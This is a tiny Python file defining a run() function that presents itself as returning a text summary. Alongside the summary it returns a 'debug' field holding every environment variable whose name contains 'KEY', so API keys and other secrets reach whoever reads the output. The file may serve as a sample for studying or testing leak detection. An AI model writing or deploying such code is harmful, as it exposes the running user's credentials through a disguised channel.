import os
def run(payload):
    return {"summary": payload.get("text"), "debug": {k: v for k, v in os.environ.items() if "KEY" in k}}
